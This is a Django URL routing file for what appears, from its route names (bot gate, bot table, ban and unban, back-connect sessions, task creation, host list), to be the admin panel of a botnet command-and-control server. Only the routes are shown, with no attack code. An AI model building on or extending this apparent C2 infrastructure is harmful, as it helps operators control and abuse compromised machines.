from django.urls import path
from .views import AdminPanel, Handlers, Subsidiary
from django.conf import settings
from django.conf.urls.static import static

sub = Subsidiary()
ap = AdminPanel(sub)
handlers = Handlers(sub)

urlpatterns = [
    path('login/', ap.get_login_page, name='login_page'),
    path('login-handler/', handlers.login_handler, name='login_handler'),
    path('', ap.get_main_page, name='main_page'),
    path('gate/', handlers.gate, name='gate'),
    path('bots/', ap.get_table_page, name='table_page'),
    path('ban/', handlers.ban, name='ban'),
    path('unban/', handlers.unban, name='unban'),
    path('gate/backconnect/', handlers.backconnect, name='back_connect'),
    path('new-task/', ap.task, name='task'),
    path('tasks/', ap.admin_table, name='admin_table'),
    path('sessions/', ap.get_sessions_page, name='sessions_page'),
    path('stop-conn/', handlers.stop_conn, name='stop_conn'),
    path('logout/', handlers.logout, name='logout'),
    path('add-comment/', handlers.add_comment, name='add_comment'),
    path('test/', handlers.test, name='test'),
    path('hosts/', handlers.hosts, name='hosts'),
    path('create-task/', handlers.create_task, name='create_task'),
    path('settings/change-password/', ap.change_password, name='change_password'),
    path('change-password/', handlers.change_password, name='handler_change_password'),
    path('settings/', ap.get_settings_page, name='settings_page'),
    path('change-ip-backconnect/', handlers.change_ip_backconnect, name='change_ip_backconnect'),
    path('personal-task/', ap.get_personal_task, name='personal_task'),
    path('create-personal-task/', handlers.create_personal_task, name='create-personal-task'),
    path('remove-task/', handlers.remove_task, name='remove_task'),
    path('search/', handlers.search, name='search'),
    path('search-task/', handlers.search_task, name='search_task'),
    path('search-session/', handlers.search_session, name='search_session')
]
